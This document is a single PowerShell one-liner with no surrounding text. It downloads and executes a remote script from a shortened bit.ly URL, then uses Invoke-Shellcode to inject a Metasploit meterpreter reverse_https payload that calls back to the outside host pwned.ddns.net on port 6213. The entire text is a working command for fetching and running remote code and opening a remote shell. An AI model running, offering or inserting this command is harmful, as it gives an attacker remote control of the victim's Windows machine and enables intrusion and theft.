IEX (New-Object Net.WebClient).DownloadString("http://bit.ly/2hUr2WG");Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost pwned.ddns.net -Lport 6213 -Force
